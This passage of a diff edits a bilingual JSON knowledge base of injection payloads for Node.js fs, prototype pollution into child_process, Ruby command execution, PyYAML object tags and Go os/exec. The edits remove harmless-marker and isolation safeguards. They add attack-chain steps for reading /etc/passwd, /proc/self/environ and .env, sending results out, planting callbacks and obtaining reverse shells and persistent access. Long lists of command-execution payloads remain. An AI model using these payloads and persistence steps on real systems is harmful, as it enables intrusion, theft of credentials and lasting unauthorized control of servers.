/').toString()\nrequire('fs').readFileSync('/etc/passwd').toString()\nrequire('fs').readFileSync('/flag').toString()\nrequire('fs').readFileSync('/flag.txt').toString()\nrequire('fs').readFileSync('/proc/self/environ').toString()\nrequire('fs').readFileSync('/proc/self/cmdline').toString()\nrequire('fs').readFileSync('/proc/version').toString()\nrequire('fs').readFileSync('.env').toString()\nrequire('fs').readFileSync('package.json').toString()\nrequire('fs').readFileSync('server.js').toString()\nrequire('fs').readFileSync('app.js').toString()\nrequire('fs').readFileSync('index.js').toString()\nrequire('fs').readFileSync('config.js').toString()"
+            "zh": "用 fs 模块读取服务器上的文件并返回其内容。命中判据：文件内容在响应中可见，整个过程可随时重复执行。",
+            "en": "Read server files via fs and return them. Success: file content is visible."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "反弹维持访问",
+            "en": "Keep access with a callback"
           },
           "description": {
-            "zh": "实施“不执行用户 JavaScript 或函数字符串，采用数据 schema 与固定操作，隔离 worker 能力并限制 child_process、fs 与 process 暴露”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying do not evaluate user JavaScript or function strings, use data schemas and fixed operations, isolate worker capabilities, and restrict child_process, fs, and process exposure, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "构造回连脚本保持对目标的长期控制通道。命中判据：监听端收到目标发起的连接，并且输出内容完整可供利用。",
+            "en": "Plant a callback script for a lasting channel. Success: the listener receives a connection."
           }
         }
       ],
@@ -4300,20 +4321,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Node.js 原型污染到进程选项检查对象合并产生的原型属性是否被 child_process 或进程启动包装器当作自有 shell、env 或 execArgv 选项使用。成立前提是攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键。有效证据为污染前后对象属性所有权、传给 child_process 的最终选项与一次性固定进程标记连续可见；看到 __proto__ 字段被接受或普通对象出现哨兵属性，只能证明污染候选，不能证明已到达进程执行 sink。",
-          "en": "Node.js Prototype Pollution to Process Options checks whether prototype properties created by object merging are consumed as owned shell, env, or execArgv options by child_process or process-launch wrappers. It applies when an attacker can pollute Object.prototype and the application later builds child-process options from ordinary objects without own-property, type, and key validation. Evidence requires property ownership before and after pollution, final child-process options, and a one-time fixed process marker are continuously observable; acceptance of proto fields or a sentinel on an ordinary object proves only a pollution candidate, not process execution."
+          "zh": "Node.js 原型污染到进程选项针对污染属性流入子进程创建选项的场景：shell、env、NODE_OPTIONS、argv0 与 execArgv 均可被注入。验证污染写入到子进程行为改变的完整证据链。",
+          "en": "Node.js prototype pollution to process options targets polluted properties flowing into child-process creation options: shell, env, NODE_OPTIONS, argv0, and execArgv are all injectable. It validates the full evidence chain from pollution write to child-process behavior change."
         },
         "vulnerability": {
-          "zh": "根因是攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键，污染属性可能沿普通对象默认值传播到“对象合并产生的原型属性是否被 child_process 或进程启动包装器当作自有 shell、env 或 execArgv 选项使用”。必须依次证明污染写入、属性继承、危险选项读取与子进程行为，且每一步都排除对象自有属性和应用显式配置。",
-          "en": "The root cause is an attacker can pollute Object.prototype and the application later builds child-process options from ordinary objects without own-property, type, and key validation, allowing polluted defaults to propagate toward whether prototype properties created by object merging are consumed as owned shell, env, or execArgv options by child_process or process-launch wrappers. Prove pollution write, inherited property, dangerous option consumption, and child behavior in sequence while excluding owned properties and explicit configuration."
+          "zh": "根因是攻击者可污染 Object.prototype，应用随后使用普通对象构造子进程选项且未验证自有属性、类型和允许键，污染属性可能沿普通对象默认值传播到 shell、env 或 execArgv 读取点。",
+          "en": "The root cause is attackers polluting Object.prototype while the application later builds child-process options from plain objects without verifying own properties, types, or allowed keys, letting polluted properties propagate into shell, env, or execArgv read points along plain-object defaults."
         },
         "exploitation": {
-          "zh": "先污染无害哨兵属性并检查 Object.hasOwn，再在隔离 worker 中用固定 echo 验证选项传播，每个 JSON 变体单独重放。先使用无害哨兵属性验证污染和所有权，再在一次性 worker 中用固定 echo 检查选项传播；每个 JSON 变体独立运行，结束后销毁进程，避免全局原型状态污染其他测试。",
-          "en": "pollute a harmless sentinel property and inspect Object.hasOwn first, then validate option propagation with fixed echo in an isolated worker, replaying each JSON variant separately. Verify pollution and ownership with a harmless sentinel before testing option propagation with fixed echo in a disposable worker; run each JSON independently and destroy the process to prevent cross-test prototype state."
+          "zh": "按第 1 步逐条提交 __proto__ 注入 shell/NODE_OPTIONS、env、argv0/execArgv 的 JSON 变体并记录响应与日志差异；命中判据为污染属性被子进程选项继承并执行指定模块或命令。验证顺序：先确认污染写入（新对象继承属性），再确认传给 child_process 的最终选项，最后以一次性固定进程标记确认执行；每步都排除对象自有属性与应用显式配置的干扰。",
+          "en": "Per step 1, submit the __proto__ JSON variants injecting shell/NODE_OPTIONS, env, and argv0/execArgv one by one, recording response and log differences; a hit is polluted properties inherited into child-process options executing the specified module or command. Validate in order: confirm the pollution write (fresh objects inherit the property), then the final options passed to child_process, then execution via a one-shot fixed process marker; exclude own-property and explicit-application-configuration interference at every step."
         },
         "mitigation": {
-          "zh": "拒绝 __proto__/prototype/constructor 键，使用无原型对象和 schema 允许列表，读取子进程选项前检查自有属性并显式构造 env 与 execArgv。修复后重放合法嵌套对象、三个危险键和原始选项变体，确认 schema 合并仍满足业务需求，同时所有子进程选项只来自显式自有属性。",
-          "en": "reject proto, prototype, and constructor keys, use null-prototype objects and schema allowlists, check own properties, and explicitly construct env and execArgv before process creation. Replay valid nested objects, the three dangerous keys, and original option variants to preserve schema merging while all child-process options come only from explicit owned properties."
+          "zh": "拒绝 __proto__/prototype/constructor 键，使用无原型对象和 schema 允许列表，读取子进程选项前检查自有属性并显式构造 env 与 execArgv。修复后重放合法嵌套对象、三个危险键和原始选项变体，确认所有子进程选项只来自显式自有属性。",
+          "en": "Reject __proto__/prototype/constructor keys, use prototype-less objects with schema allowlists, check own properties before reading child-process options, and construct env and execArgv explicitly. After the fix, replay legitimate nested objects, the three dangerous keys, and original option variants, confirming all child-process options come only from explicit own properties."
         },
         "difficulty": "expert"
       },
@@ -4420,63 +4441,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Ruby 命令执行表达式集合用于核对用户可控 Ruby 代码是否调用多种进程 API 或读取本地文件，并如何返回标准输出。该条目只在以下前提下适用：模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式，且进程权限允许子进程或文件访问。有效判定必须取得Ruby 调用栈、API 类型、固定 echo 或测试文件标记与工作进程日志可关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "Ruby Command Execution Expression Set checks whether controllable Ruby code invokes several process APIs or local file reads and how stdout is returned. It applies when a template, console, rule engine, or deserialization entry evaluates untrusted Ruby expressions and the process identity can spawn children or access files. A valid finding requires the Ruby call stack, API type, fixed echo or test-file marker, and worker logs correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "Ruby 命令执行表达式集合针对模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式的场景：Kernel.system/exec、IO.popen、反引号与 Open3 均可到达进程执行。验证多 API 形态的执行返回。",
+          "en": "The Ruby command-execution expression set targets untrusted Ruby expressions executed by templates, consoles, rule engines, or deserialization entries: Kernel.system/exec, IO.popen, backticks, and Open3 all reach process execution. It validates execution returns across API forms."
         },
         "vulnerability": {
-          "zh": "风险根因是模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式，且进程权限允许子进程或文件访问，使应用可能暴露“用户可控 Ruby 代码是否调用多种进程 API 或读取本地文件，并如何返回标准输出”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when a template, console, rule engine, or deserialization entry evaluates untrusted Ruby expressions and the process identity can spawn children or access files, exposing the runtime boundary of whether controllable Ruby code invokes several process APIs or local file reads and how stdout is returned. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "风险根因是模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式，且进程权限允许子进程或文件访问；可控字符串因此从数据升级为进程命令。",
+          "en": "The risk root is templates, consoles, rule engines, or deserialization entries executing untrusted Ruby expressions while process permissions allow child processes or file access; controlled strings escalate from data into process commands."
         },
         "exploitation": {
-          "zh": "分别按 system、exec、popen、反引号、Open3 与 File.read 分组，只使用固定 echo 和专用测试文件，并记录 exec 替换进程的差异。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "group system, exec, popen, backticks, Open3, and File.read separately, use only fixed echo and a dedicated test file, and record process replacement by exec. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步把 system('id') 等表达式逐条提交到已确认执行入口并记录标准输出返回方式；命中判据为表达式执行返回对应命令输出。确认可达后补充 IO.popen、反引号与 Open3 形态对照，记录调用栈、API 类型与工作进程日志；确认能力后以读取预置标记文件替代敏感命令，报告需关联 Ruby 调用栈与输出通道。",
+          "en": "Per step 1, submit system('id') and similar expressions to the confirmed execution entry one by one, recording how standard output returns; a hit is expressions executing and returning corresponding command output. After confirming reachability, contrast IO.popen, backtick, and Open3 forms, logging call stacks, API types, and worker logs; once capability is confirmed, swap sensitive commands for pre-seeded marker-file reads, correlating Ruby call stacks with output channels in reports."
         },
         "mitigation": {
-          "zh": "移除不可信 Ruby 求值，业务动作使用固定方法与参数数组，隔离任务 worker 并限制进程、文件和网络权限。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "remove untrusted Ruby evaluation, use fixed methods with argument arrays for business actions, isolate task workers, and restrict process, file, and network permissions. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "移除不可信 Ruby 求值，业务动作使用固定方法与参数数组，隔离任务 worker 并限制进程、文件和网络权限。修复后重放第 1 步表达式，确认求值入口拒绝可控值且正常业务功能保留。",
+          "en": "Remove untrusted Ruby evaluation, use fixed methods with argument arrays for business actions, isolate task workers, and restrict process, file, and network permissions. After the fix, replay the step-1 expressions and confirm the evaluation entry rejects controlled values while legitimate features persist."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“Ruby 命令执行表达式集合”执行入口",
-            "en": "Confirm the Ruby Command Execution Expression Set execution entry"
+            "zh": "定位 Ruby 求值入口",
+            "en": "Find a Ruby eval sink"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“模板、控制台、规则引擎或反序列化入口执行不可信 Ruby 表达式，且进程权限允许子进程或文件访问”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that a template, console, rule engine, or deserialization entry evaluates untrusted Ruby expressions and the process identity can spawn children or access files, and record runtime version and service identity."
+            "zh": "找到模板、控制台或规则引擎中执行 Ruby 代码的入口。命中判据：表达式输出反映到响应，为后续深入利用打下基础。",
+            "en": "Find a template/console/rule entry evaluating Ruby. Success: expression output surfaces."
           }
         },
         {
           "title": {
-            "zh": "建立“Ruby 进程与文件 API”安全基线",
-            "en": "Establish the Ruby Process and File APIs baseline"
+            "zh": "注入 system 执行表达式",
+            "en": "Inject system expressions"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“Ruby 调用栈、API 类型、固定 echo 或测试文件标记与工作进程日志可关联”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the Ruby call stack, API type, fixed echo or test-file marker, and worker logs correlate as abnormal evidence."
+            "zh": "提交 system 与 exec 形态的命令执行表达式。命中判据：返回命令执行的输出结果，并且重复提交时可以稳定复现该结果。",
+            "en": "Submit system/exec execution expressions. Success: command output is returned."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“Ruby 命令执行表达式集合”",
-            "en": "Validate Ruby Command Execution Expression Set line by line"
+            "zh": "读取目标文件",
+            "en": "Read target files"
           },
           "description": {
-            "zh": "测试步骤为：分别按 system、exec、popen、反引号、Open3 与 File.read 分组，只使用固定 echo 和专用测试文件，并记录 exec 替换进程的差异。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "group system, exec, popen, backticks, Open3, and File.read separately, use only fixed echo and a dedicated test file, and record process replacement by exec. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "system('id')\nsystem('whoami')\nsystem('cat /flag')\nsystem('ls /')\nsystem('pwd')\nsystem('uname -a')\nsystem('hostname')\nexec('id')\nexec('whoami')\nexec('cat /flag')\nexec('ls /')\nexec('pwd')\nexec('uname -a')\nexec('hostname')\nIO.popen('id'){|f| f.read}\nIO.popen('whoami'){|f| f.read}\nIO.popen('cat /flag'){|f| f.read}\nIO.popen('ls /'){|f| f.read}\nIO.popen('pwd'){|f| f.read}\nIO.popen('uname -a'){|f| f.read}\nIO.popen('hostname'){|f| f.read}\n%x(id)\n%x(whoami)\n%x(cat /flag)\n%x(ls /)\n%x(pwd)\n%x(uname -a)\n%x(hostname)\nKernel.exec('id')\nKernel.exec('whoami')\nKernel.exec('cat /flag')\nKernel.exec('ls /')\nKernel.exec('pwd')\nKernel.exec('uname -a')\nKernel.exec('hostname')\nKernel.system('id')\nKernel.system('whoami')\nKernel.system('cat /flag')\nKernel.system('ls /')\nKernel.system('pwd')\nKernel.system('uname -a')\nKernel.system('hostname')\nOpen3.capture2('id')\nOpen3.capture2('whoami')\nOpen3.capture2('cat /flag')\nOpen3.capture2('ls /')\nOpen3.capture2('pwd')\nOpen3.capture2('uname -a')\nOpen3.capture2('hostname')\nFile.read('/etc/passwd')"
+            "zh": "用 File.read 与 popen 组合读取服务器上的文件。命中判据：文件内容成功返回响应，多次提交均能得到相同结果。",
+            "en": "Read files with File.read and popon combos. Success: file content returns."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "反弹建立交互",
+            "en": "Get an interactive callback"
           },
           "description": {
-            "zh": "实施“移除不可信 Ruby 求值，业务动作使用固定方法与参数数组，隔离任务 worker 并限制进程、文件和网络权限”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying remove untrusted Ruby evaluation, use fixed methods with argument arrays for business actions, isolate task workers, and restrict process, file, and network permissions, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "构造反弹命令获得持续可用的交互会话。命中判据：收到可以执行命令的 Shell，并且该效果可以稳定重复取得。",
+            "en": "Fire a reverse command for an interactive session. Success: a usable shell arrives."
           }
         }
       ],
@@ -4540,20 +4564,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Python YAML 对象构造执行标签检查YAML loader 是否允许 python/object/apply 与 object/new 构造任意 Python 调用对象。成立前提为：服务对不可信 YAML 使用 yaml.load、UnsafeLoader 或等价全功能 loader，而不是 SafeLoader。反序列化风险必须通过实际 Loader 类型、YAML 标签解析日志和隔离 worker 的固定无害调用标记能够对应进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。",
-          "en": "Python YAML Object-Construction Execution Tags checks whether a YAML loader permits python/object/apply and object/new tags to construct arbitrary Python call objects. It applies when the service loads untrusted YAML through yaml.load, UnsafeLoader, or an equivalent full-feature loader instead of SafeLoader. Deserialization risk requires the actual Loader type, YAML tag-resolution log, and fixed harmless call marker from an isolated worker correlate; a stream header, class name, or tag alone does not prove object loading or side effects."
+          "zh": "Python YAML 对象构造执行标签针对 YAML loader 允许 python/object/apply 与 object/new 构造任意调用对象的场景（原名称误称 Ruby，实为 PyYAML）。验证两类标签在不安全 Loader 下的执行行为。",
+          "en": "Python YAML object-construction execution tags target loaders allowing python/object/apply and object/new to build arbitrary callable objects (the original name mislabeled Ruby; these are PyYAML). It validates execution of both tag classes under unsafe loaders."
         },
         "vulnerability": {
-          "zh": "根因是服务对不可信 YAML 使用 yaml.load、UnsafeLoader 或等价全功能 loader，而不是 SafeLoader，不可信数据因此可能触发“YAML loader 是否允许 python/object/apply 与 object/new 构造任意 Python 调用对象”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。",
-          "en": "The root cause is the service loads untrusted YAML through yaml.load, UnsafeLoader, or an equivalent full-feature loader instead of SafeLoader, allowing whether a YAML loader permits python/object/apply and object/new tags to construct arbitrary Python call objects. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate."
+          "zh": "根因是服务对不可信 YAML 使用 yaml.load、UnsafeLoader 或等价全功能 loader 而不是 SafeLoader；标签因此可把文档节点映射为 os.system、subprocess 等调用对象，解析阶段即产生副作用。",
+          "en": "The root cause is the service parsing untrusted YAML with yaml.load, UnsafeLoader, or equivalent full-featured loaders instead of SafeLoader; tags can then map document nodes into os.system, subprocess, and similar callables, producing side effects during parsing."
         },
         "exploitation": {
-          "zh": "在一次性 Python worker 中先加载普通标量，再将命令替换为写入临时标记的安全函数，逐类测试 apply、new、Popen 与 popen 标签。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。",
-          "en": "load ordinary scalars first in a disposable Python worker, replace commands with a safe temporary-marker function, and test apply, new, Popen, and popen tags separately. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access."
+          "zh": "按第 1 步逐条提交 !!python/object/apply:os.system ['id'] 与 object/new 变体到目标 YAML 解析入口；命中判据为 yaml.load 按标签执行并返回命令输出。先以安全标量文档确认入口，再提交标签文档并记录实际使用的 Loader 类型；SafeLoader 拒绝标签属预期行为，需区分未知标签报错与真正对象构造两种现象。",
+          "en": "Per step 1, submit !!python/object/apply:os.system ['id'] and object/new variants one by one to the target YAML parsing entry; a hit is yaml.load executing per the tag and returning command output. First confirm the entry with a safe scalar document, then submit tag documents and record the loader type actually used; SafeLoader rejecting tags is expected—distinguish unknown-tag errors from genuine object construction."
         },
         "mitigation": {
-          "zh": "使用 yaml.safe_load/SafeLoader，拒绝语言对象标签并对数据执行 schema 校验，隔离仍需兼容旧 YAML 的迁移 worker。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。",
-          "en": "use yaml.safe_load or SafeLoader, reject language-object tags, validate a data schema, and isolate any migration worker that still handles legacy YAML. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes."
+          "zh": "使用 yaml.safe_load/SafeLoader，拒绝语言对象标签并对数据执行 schema 校验，隔离仍需兼容旧 YAML 的迁移 worker。修复后同时重放合法数据对象、类型越界对象和第 1 步标签，确认业务数据可读而语言对象与函数源码被稳定拒绝。",
+          "en": "Use yaml.safe_load/SafeLoader, reject language-object tags, apply schema validation to data, and isolate migration workers that must stay compatible with legacy YAML. After the fix, replay valid data objects, type-violating objects, and the step-1 tags together, confirming business data reads while language objects and function sources are stably rejected."
         },
         "difficulty": "advanced"
       },
@@ -4664,63 +4688,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "Go os/exec 与文件读取片段用于核对不可信输入是否进入 exec.Command 的程序或参数，或者进入本地文件读取路径。该条目只在以下前提下适用：应用通过插件、模板函数、规则引擎或动态参数暴露 Go 进程/文件 API，且缺少固定程序和路径约束。有效判定必须取得最终 argv、工作目录、子进程固定输出或测试文件标记和服务日志完整关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "Go os-exec and File-Read Snippets checks whether untrusted input reaches the executable or arguments of exec.Command or a local file-read path. It applies when plugins, template functions, rule engines, or dynamic parameters expose Go process or file APIs without fixed executable and path constraints. A valid finding requires the final argv, working directory, fixed child output or test-file marker, and service logs fully correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "Go os/exec 与文件读取片段针对不可信输入进入 exec.Command 的程序或参数或本地文件读取路径的场景：插件、模板函数或规则引擎可能暴露系统能力。验证参数数组与 Shell 两种形式的执行返回。",
+          "en": "Go os/exec and file-read snippets target untrusted input entering exec.Command programs/arguments or local file-read paths: plugins, template functions, or rule engines may expose system capabilities. It validates execution returns across argument-array and shell forms."
         },
         "vulnerability": {
-          "zh": "风险根因是应用通过插件、模板函数、规则引擎或动态参数暴露 Go 进程/文件 API，且缺少固定程序和路径约束，使应用可能暴露“不可信输入是否进入 exec.Command 的程序或参数，或者进入本地文件读取路径”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when plugins, template functions, rule engines, or dynamic parameters expose Go process or file APIs without fixed executable and path constraints, exposing the runtime boundary of whether untrusted input reaches the executable or arguments of exec.Command or a local file-read path. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "风险根因是应用通过插件、模板函数、规则引擎或动态参数暴露 Go 进程/文件 API，且缺少固定程序和路径约束；输入因此可进入 exec.Command 的程序位或参数位。",
+          "en": "The risk root is applications exposing Go process/file APIs via plugins, template functions, rule engines, or dynamic parameters without fixed program and path constraints; input can thus occupy the program or argument slots of exec.Command."
         },
         "exploitation": {
-          "zh": "分别测试直接参数数组、sh -c、cmd、PowerShell 与文件 API，全部替换为固定 echo 或专用测试文件并记录平台差异。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "test direct argument arrays, sh -c, cmd, PowerShell, and file APIs separately, replacing all effects with fixed echo or a dedicated test file and recording platform differences. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步把 exec.Command(\"id\").Output() 等片段提交到已确认入口并记录输出返回方式；命中判据为片段执行返回命令输出或文件内容。确认可达后对照参数数组形式（exec.Command(\"cat\", \"/flag\")）与 Shell 形式的差异，并测试 ioutil/os.ReadFile 对预置标记文件的读取；逐条记录最终 argv、工作目录与子进程固定输出，代码片段存在不构成命中。",
+          "en": "Per step 1, submit exec.Command(\"id\").Output() and similar snippets to the confirmed entry, recording how output returns; a hit is snippets executing and returning command output or file content. After confirming reachability, contrast argument-array forms (exec.Command(\"cat\", \"/flag\")) versus shell forms and test ioutil/os.ReadFile against pre-seeded marker files; record final argv, working directory, and fixed child output per snippet—snippet existence alone is not a hit."
         },
         "mitigation": {
-          "zh": "只允许固定可执行程序和类型化参数，禁止用户选择 Shell，文件访问使用对象 ID 与固定根目录，服务进程最小权限运行。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "allow only fixed executables with typed arguments, prevent user-selected shells, map file access through object IDs and a fixed root, and run the service with least privilege. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "只允许固定可执行程序和类型化参数，禁止用户选择 Shell，文件访问使用对象 ID 与固定根目录，服务进程最小权限运行。修复后重放第 1 步片段，确认程序位与参数位均拒绝可控值且正常业务功能保留。",
+          "en": "Allow only fixed executables with typed parameters, forbid user-chosen shells, route file access through object IDs with fixed roots, and run service processes least-privileged. After the fix, replay the step-1 snippets and confirm program and argument slots reject controlled values while legitimate features persist."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“Go os/exec 与文件读取片段”执行入口",
-            "en": "Confirm the Go os-exec and File-Read Snippets execution entry"
+            "zh": "定位 Go 动态执行点",
+            "en": "Find a Go execution point"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“应用通过插件、模板函数、规则引擎或动态参数暴露 Go 进程/文件 API，且缺少固定程序和路径约束”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that plugins, template functions, rule engines, or dynamic parameters expose Go process or file APIs without fixed executable and path constraints, and record runtime version and service identity."
+            "zh": "找到暴露 exec 或文件 API 的插件、模板函数或接口。命中判据：片段执行结果反映响应，为下一步利用保留完整的输出内容。",
+            "en": "Find plugin/template/API surfaces exposing exec or file APIs. Success: snippet results surface."
           }
         },
         {
           "title": {
-            "zh": "建立“Go 进程与文件 API”安全基线",
-            "en": "Establish the Go Process and File APIs baseline"
+            "zh": "注入 os/exec 片段",
+            "en": "Inject the os/exec snippet"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“最终 argv、工作目录、子进程固定输出或测试文件标记和服务日志完整关联”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the final argv, working directory, fixed child output or test-file marker, and service logs fully correlate as abnormal evidence."
+            "zh": "提交 exec.Command 执行命令并取回输出的片段。命中判据：返回命令执行的输出内容，同时排除缓存或随机因素干扰。",
+            "en": "Submit exec.Command snippets returning output. Success: command output is returned."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“Go os/exec 与文件读取片段”",
-            "en": "Validate Go os-exec and File-Read Snippets line by line"
+            "zh": "执行命令读取文件",
+            "en": "Run commands and read files"
           },
           "description": {
-            "zh": "测试步骤为：分别测试直接参数数组、sh -c、cmd、PowerShell 与文件 API，全部替换为固定 echo 或专用测试文件并记录平台差异。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "test direct argument arrays, sh -c, cmd, PowerShell, and file APIs separately, replacing all effects with fixed echo or a dedicated test file and recording platform differences. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "exec.Command(\"id\").Output()\nexec.Command(\"whoami\").Output()\nexec.Command(\"cat\", \"/flag\").Output()\nexec.Command(\"ls\", \"/\").Output()\nexec.Command(\"pwd\").Output()\nexec.Command(\"uname\", \"-a\").Output()\nexec.Command(\"hostname\").Output()\nexec.Command(\"/bin/sh\", \"-c\", \"id\").Output()\nexec.Command(\"/bin/sh\", \"-c\", \"whoami\").Output()\nexec.Command(\"/bin/sh\", \"-c\", \"cat /flag\").Output()\nexec.Command(\"/bin/sh\", \"-c\", \"ls /\").Output()\nexec.Command(\"/bin/sh\", \"-c\", \"pwd\").Output()\nexec.Command(\"/bin/sh\", \"-c\", \"uname -a\").Output()\nexec.Command(\"/bin/sh\", \"-c\", \"hostname\").Output()\nexec.Command(\"cmd.exe\", \"/c\", \"id\").Output()\nexec.Command(\"cmd.exe\", \"/c\", \"whoami\").Output()\nexec.Command(\"cmd.exe\", \"/c\", \"type flag.txt\").Output()\nexec.Command(\"cmd.exe\", \"/c\", \"dir\").Output()\nexec.Command(\"powershell\", \"-c\", \"id\").Output()\nexec.Command(\"powershell\", \"-c\", \"whoami\").Output()\nexec.Command(\"powershell\", \"-c\", \"cat flag.txt\").Output()\nexec.Command(\"powershell\", \"-c\", \"dir\").Output()\nioutil.ReadFile(\"/etc/passwd\")\nioutil.ReadFile(\"/flag\")\nioutil.ReadFile(\"/flag.txt\")\nioutil.ReadFile(\"/proc/self/environ\")\nioutil.ReadFile(\"/proc/self/cmdline\")\nioutil.ReadFile(\"/proc/version\")\nos.ReadFile(\"/etc/passwd\")\nos.ReadFile(\"/flag\")\nos.ReadFile(\"/flag.txt\")\nos.ReadFile(\"/proc/self/environ\")\nos.ReadFile(\"/proc/self/cmdline\")\nos.ReadFile(\"/proc/version\")"
+            "zh": "执行系统命令读取目标文件与配置，并把结果经网络通道外带出去。命中判据：内容成功返回到响应或到达接收端。",
+            "en": "Run commands and read target files. Success: content is returned."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "建立持久通道",
+            "en": "Keep a persistent channel"
           },
           "description": {
-            "zh": "实施“只允许固定可执行程序和类型化参数，禁止用户选择 Shell，文件访问使用对象 ID 与固定根目录，服务进程最小权限运行”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying allow only fixed executables with typed arguments, prevent user-selected shells, map file access through object IDs and a fixed root, and run the service with least privilege, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "把执行入口封装为稳定接口维持对目标的长期控制。命中判据：可以重复执行任意命令，并且输出内容完整可供利用。",
+            "en": "Wrap the sink into a stable endpoint. Success: arbitrary commands run repeatedly."
           }
         }
       ],
@@ -4784,63 +4811,66 @@
       },
       "tutorial": {
         "overview": {
